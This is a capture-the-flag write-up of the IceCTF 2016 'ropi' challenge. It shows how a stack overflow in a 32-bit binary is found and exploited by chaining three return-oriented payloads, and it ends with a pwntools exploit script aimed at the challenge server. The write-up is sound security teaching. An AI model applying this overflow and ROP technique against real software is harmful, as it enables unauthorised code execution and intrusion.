#Nullp0inter's ropi write up for IceCTF 2016

##Ropi Pwn 75pts
Ritorno orientata programmazione 
nc.ropi.vuln.icec.tf 6500

## Write Up
In this challange we are again given a download link for what we find out is a 32-bit ELF executeable binary. The challenge name and hint tell us we will probably be doing rop but beyond that or the specifics we don't really know yet. When we fire up the binary we get the following:

```
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?

```

Uh oh, Italian. I don't speak that so I threw it into Google Translate and got the following translation:

```
Welcome to Pro Rectors conference!
Wants to leave a message?
```

So ok, its supposed to let me leave like a message. We get the gist. So now I tried entering just a bit of input to see normal execution:

```
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
Never gonna give you up
addio!
```

It just comes back and prints addio!. Ok, now what? Well lets see if we can crash it:
```zsh
python -c "print 'D'*100" | ./ropi 
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[1]    72553 done                              python -c "print 'D'*100" | 
       72554 segmentation fault (core dumped)  ./ropi
```

YISSS, a core dump, lets examine that in gdb:

```bash
Stopped reason: SIGSEGV
0x44444444 in ?? ()
```
Awesome! It looks like we overwrote EIP, now we can generate a string with `ragg2` to take the guesswork (or real reversing) out of figuring out the buffer size:
```bash
ragg2 -P 100 -r
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAA
```
Using the string ragg2 generated:
```bash
Stopped reason: SIGSEGV
0x41415041 in ?? ()
```
Translating that to an ASCII string we get 'AAPA'. There are two ways to do this now which are either copying the string right up to the first A and using something like len() in Python, but I'm going to use a builtin tool for radare2, `wopO <hex pattern>` which will basically search for how far off that pattern is in the string we generated:
```bash
r2 ropi
 -- This is amazing ...
 [0x08048430]> wopO 0x41415041
 43
```

43 bytes of padding, alright, we can work with that. Now would be a good time to see where we actually get input and how much we get. We can do this by objdump or by IDA. I'm still learning to reverse so for now I'll just use IDA. 

Disassembling with IDA we get the following functions:

#####main:
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
      ezy();
        puts("addio!");
          return 0;
}
```

#####ezy:
```C
ssize_t ezy()
{
      char buf; // [sp+10h] [bp-28h]@1

        puts("Benvenuti al convegno RetOri Pro!\nVuole lasciare un messaggio?");
          fflush(stdout);
            return read(0, &buf, 0x40u);
}
```

#####ret:
```C
int __cdecl ret(int a1)
{
      if ( a1 != -1159991569 )
            {
                    puts("chiave sbagliata! :(");
                        exit(1);
                          }
        fd = open("./flag.txt", 0);
          puts("[+] aperto");
            return fflush(stdout);
}
```

#####ori:
```C
int __cdecl ori(int a1, int a2)
{
      if ( a1 != -1412567041 && a2 != 2018915346 )
            {
                    puts("chiave sbagliata! :((");
                        exit(1);
                          }
        read(fd, &dati, 0x80u);
          puts("[+] leggi");
            return fflush(stdout);
}
```

#####pro:
```C
int pro()
{
      puts("[+] stampare");
        printf("%s", &dati);
          return fflush(stdout);
}
```
Using the disassembled functions we can see a few things. Firstly, we gain our input through a call to read and are given a max of 64 bytes (from nbytes being 0x40, which in decimal is 64). We know that for whatever reason, 43 or so bytes in we start to overwrite the EIP. This means we have *roughly* 20 bytes left to play with. Secondly we can see there are three functions other than `main()` and `ezy()` and each appears to have some part of loading and displaying the flag and have to be done in order.

We now know that we have 44 bytes to EIP, 20 bytes to play with including EIP overwrite, 3 functions that must be called in the order `ret()`->`ori()`->`pro()` (return oriented programming), and that these functions all (save `pro()`) appear to have some sort of check at the beginning. Converting those ugly looking numbers to hex we get that `ret()` wants an argument to be `0xbadbeeef` (thats beef with three 'e's) and `ori()` wants two which are 0xabcdefff and 0x78563412. If we fail to provide those then the program prints a failure message and exits.

What now? Well reviewing how ret2libc attacks work, we know that if we can hijack EIP as we have done then we can make it return to wherever we want in the program and do even more so long as we set the stack frame right. So first instinct is to try to make it do `main()`->`ezy()`->`ret()`->`ori()`->`pro()` but we quickly find that there is a problem. Distance to EIP is 44 bytes which leaves us with 20 bytes to craft the exploit. The addresses alone for ret, ori, and pro will take up 12 which leaves us with 8 bytes left. We then need to account for the 4 byte 'canary' in ret, and the two 4 byte 'canaries' in ori. Adding that all up we end up 4 bytes over what we have. That's a problem. So now what? Get clever with the rop gadgets?

Well if you recall I said we could use the EIP access to return ANYWHERE, and as it turns out our vulnerability is in its own function too: `ezy()`! So what do we do about it? Well we know during the same execution we must visit `ret()`,`ori()`, and `pro()` all in order and we also now know we can jump back to `ezy()` which means.... ARBITRARY JUMPING! 

If we first go to `ret()` and have it return to `ezy()` rather than `ori()` it means that we can rewrite our exploit and do it again, effectively "chaining" it, so that we can then jump to `ori()` and back to `ezy()` one final time to make a final jump to `pro()`

We have three seperate payloads we then need to construct:

```
payload one:    'A'*44<address of ret><address of ezy><0xbadbeeef>
payload two:    'A'*44<address of ori><address of ezy><0xabcdefff><0x78563412>
payload three:  'A'*44<address of pro><address of main, or just junk>
```

Luckily for us, pwntools makes sending these multiple encoded payloads really easy, setting it up just like that we get the following exploit script in python:

```Python
#!/usr/bin/python

# @nullp0inter
# IceCTF ROPI

from pwn import *

# Addresses
main        = 0x08048661
ezy_addr    = 0x0804852d
ret_addr    = 0x08048569
ret_can     = 0xbadbeeef
ori_addr    = 0x080485c4
ori_can1    = 0xabcdefff
ori_can2    = 0x78563412
pro_addr    = 0x0804862c

# Payload Generation
payload      = 'A'*44
payload     += p32(ret_addr)
    payload     += p32(ezy_addr)
    payload     += p32(ret_can)
    payload2     = 'A'*44
    payload2    += p32(ori_addr)
    payload2    += p32(ezy_addr)
    payload2    += p32(ori_can1)
    payload2    += p32(ori_can2)
    payload3     = 'A'*44
    payload3    += p32(pro_addr)
    payload3    += p32(main)

# Start Pwnage
    p = remote('ropi.vuln.icec.tf',6500) # Remote
#p = process('ropi') # local

    p.recv()
    p.sendline(payload)
    p.recv()
    p.sendline(payload2)
    p.recv()
    p.sendline(payload3)
    p.interactive()
```


##Special Thanks:
Special thanks to members both past and present of my club, wcsc, for all the information they shared with me. I was able to finally solve some fairly difficult challenges thanks to them answering my repeated stupid questions (ropi at 131 solves, dear_diary at 78)

##Resources:
I found a ton of great resources during the challenge for learning about ROP attacks:

[Saumil Shah's 'Dive Into ROP'](http://www.slideshare.net/saumilshah/dive-into-rop-a-quick-introduction-to-return-oriented-programming "Dive Into ROP")

[Saumil Shah's 'How Functions Work'](http://www.slideshare.net/saumilshah/how-functions-work-7776073 "How Functions Work")

[Jeffrey Crowell's Blog Post on "Pwning With Radare2"](http://crowell.github.io/blog/2014/11/23/pwning-with-radare2/ "Pwning With R2")
